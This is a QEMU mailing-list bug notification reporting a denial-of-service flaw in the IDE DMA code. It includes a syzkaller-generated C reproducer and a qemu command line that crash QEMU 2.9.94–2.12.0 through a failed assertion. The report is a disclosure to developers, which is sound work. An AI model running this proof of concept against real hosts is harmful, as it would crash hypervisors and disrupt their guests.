Received: from eggs.gnu.org ([2001:4830:134:3::10]:40351)
	by lists.gnu.org with esmtp (Exim 4.71)
	(envelope-from <bounces@canonical.com>) id 1fUnbk-0006zE-CR
	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:25:45 -0400
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
	(envelope-from <bounces@canonical.com>) id 1fUnbh-0005LS-2r
	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:25:44 -0400
Received: from indium.canonical.com ([91.189.90.7]:45042)
	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
	(Exim 4.71) (envelope-from <bounces@canonical.com>)
	id 1fUnbg-0005L3-Pl
	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:25:40 -0400
Received: from loganberry.canonical.com ([91.189.90.37])
	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
	id 1fUnbf-0004dI-D0
	for <qemu-devel@nongnu.org>; Mon, 18 Jun 2018 06:25:39 +0000
Received: from loganberry.canonical.com (localhost [127.0.0.1])
	by loganberry.canonical.com (Postfix) with ESMTP id 4D68B2E80CB
	for <qemu-devel@nongnu.org>; Mon, 18 Jun 2018 06:25:39 +0000 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Date: Mon, 18 Jun 2018 06:17:18 -0000
From: icytxw <1777315@bugs.launchpad.net>
Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
Sender: bounces@canonical.com
References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
Message-Id: <152930263893.26643.16947343282485174760.malone@gac.canonical.com>
Errors-To: bounces@canonical.com
Subject: [Qemu-devel] [Bug 1777315] Re: Denial of service
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <http://lists.nongnu.org/archive/html/qemu-devel/>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
To: qemu-devel@nongnu.org

Oh no, this is a misunderstanding.

More Details:
use this script https://raw.githubusercontent.com/google/syzkaller/master/t=
ools/create-image.sh create =

 wheezy.img
than run: =

qemu-system-x86_64 -m 2048 -smp 1 -net nic -net user,host=3D10.0.2.10,hostf=
wd=3Dtcp::59199-:22 -display none -serial stdio -no-reboot -enable-kvm -hda=
 /home/icy/linux-master/wheezy.img -snapshot -kernel /home/icy/linux-master=
/arch/x86/boot/bzImage -append "console=3DttyS0 earlyprintk=3Dserial oops=
=3Dpanic nmi_watchdog=3Dpanic panic_on_warn=3D1 panic=3D86400 ftrace_dump_o=
n_oops=3Dorig_cpu rodata=3Dn vsyscall=3Dnative net.ifnames=3D0 biosdevname=
=3D0 kvm-intel.nested=3D1 kvm-intel.unrestricted_guest=3D1 kvm-intel.vmm_ex=
clusive=3D1 kvm-intel.fasteoi=3D1 kvm-intel.ept=3D1 kvm-intel.flexpriority=
=3D1 kvm-intel.vpid=3D1 kvm-intel.emulate_invalid_guest_state=3D1 kvm-intel=
.eptad=3D1 kvm-intel.enable_shadow_vmcs=3D1 kvm-intel.pml=3D1 kvm-intel.ena=
ble_apicv=3D1 root=3D/dev/sda"

bzImage is obtained by compiling v4.17 kernel(I am not sure if it works
in other kernel version).

than execute the program in the virtual machine: ./repro =

qemu will crash, output innformation:
 qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =3D=
=3D s->sg.size' failed. =


this bug influences at least qemu-2.9.94 - qemu-2.12.0.


** Changed in: qemu
     Assignee: icytxw (icytxw) =3D> (unassigned)

-- =

You received this bug notification because you are a member of qemu-
devel-ml, which is subscribed to QEMU.
https://bugs.launchpad.net/bugs/1777315

Title:
  Denial of service

Status in QEMU:
  New

Bug description:
  Hi,
  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
2.12.0

  run the program in qemu-2.12.0:
  #define _GNU_SOURCE =

  #include <endian.h>
  #include <sys/syscall.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <string.h>
  #include <sys/stat.h>
  #include <stdint.h>
  #include <string.h>

  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
  {
          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
                  char buf[128];
                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
lock", (uint8_t)a1, (uint8_t)a2);
                  return open(buf, O_RDWR, 0);
          } else {
                  char buf[1024];
                  char* hash;
  strncpy(buf, (char*)a0, sizeof(buf) - 1);
                  buf[sizeof(buf) - 1] =3D 0;
                  while ((hash =3D strchr(buf, '#'))) {
                          *hash =3D '0' + (char)(a1 % 10);
                          a1 /=3D 10;
                  }
                  return open(buf, a2, 0);
          }
  }

  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
  void loop()
  {
          long res =3D 0;
  memcpy((void*)0x20000000, "/dev/sg#", 9);
          res =3D syz_open_dev(0x20000000, 0, 2);
          if (res !=3D -1)
                  r[0] =3D res;
          res =3D syscall(__NR_dup2, r[0], r[0]);
          if (res !=3D -1)
                  r[1] =3D res;
  *(uint8_t*)0x20000ec0 =3D 0;
  *(uint8_t*)0x20000ec1 =3D 0;
  *(uint8_t*)0x20000ec2 =3D 0;
  *(uint8_t*)0x20000ec3 =3D 0;
  *(uint32_t*)0x20000ec8 =3D 0;
  *(uint8_t*)0x20000ed8 =3D 0;
  *(uint8_t*)0x20000ed9 =3D 0;
  *(uint8_t*)0x20000eda =3D 0;
  *(uint8_t*)0x20000edb =3D 0;
  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
b3", 12);
          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
  }

  int main()
  {
          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
          loop();
          return 0;
  }
  this will crash qemu, output information:
   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
=3D=3D s->sg.size' failed.

  =

  Thanks =

  owl337

To manage notifications about this bug go to:
https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions
